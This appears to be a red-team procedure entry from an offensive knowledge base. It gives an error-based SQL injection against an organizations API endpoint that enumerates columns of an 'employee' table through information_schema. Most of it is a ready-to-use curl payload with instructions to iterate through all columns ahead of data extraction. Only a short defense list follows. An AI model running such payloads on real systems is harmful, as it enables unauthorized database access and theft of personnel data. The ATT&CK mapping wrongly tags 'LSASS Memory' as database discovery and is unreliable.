---
id: proc-uuid-005
name: Dump-Column-Names-from-Employee-Table
type: procedure
verified: false
submitted: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:26.493Z'
tactics:
  - '[[Collection]]'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[LSASS Memory]]'
sub_techniques: []
tags:
  - sqli
  - column-dump
  - employee-table
commands:
  - '[[commands/curl-dump-columns]]'
platforms:
  - Web
  - MySQL
tools: []
skill_level: intermediate
impact_level: high
detection_risk: high
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[LSASS Memory]]'
---

# Dump-Column-Names-from-Employee-Table

## Summary

This procedure extracts column names from the 'employee' table using SQL injection on information_schema.columns.

## Description

Targeted query on columns where table_name='employee', using extractvalue to leak names like 'employee_edipi', 'employee_email'.

## Requirements

1. Table names from prior enumeration
2. curl

## Defense

- Least privilege on DB user
- Block schema queries
- Rate limiting on API

## Objectives

1. Reveal sensitive column structures
2. Prepare for data extraction

## Instructions

### Step 1: Query Columns for Employee Table

**Context**: Select column_name with WHERE and LIMIT for dumping.

**Command** ([[commands/curl-dump-columns]]):
```bash
curl -X GET "https://target.com/api/organizations/'or(extractvalue(1,concat(1,(select(column_name)from information_schema.columns where table_name='employee' limit 0,1))))='" -H "Host: target.com" --compressed
```
(Iterate LIMIT for all columns)

> Expected: Errors leaking columns such as 'employee_edipi', 'employee_email', 'employee_rank_id'.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]] Collection

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[LSASS Memory]] Database Account Discovery (columns)

### Sub-Techniques


## Commands Used

- [[commands/curl-dump-columns]]

## Tools Used


## Tags

- [[sqli]]
- [[column-dump]]
- [[employee-table]]
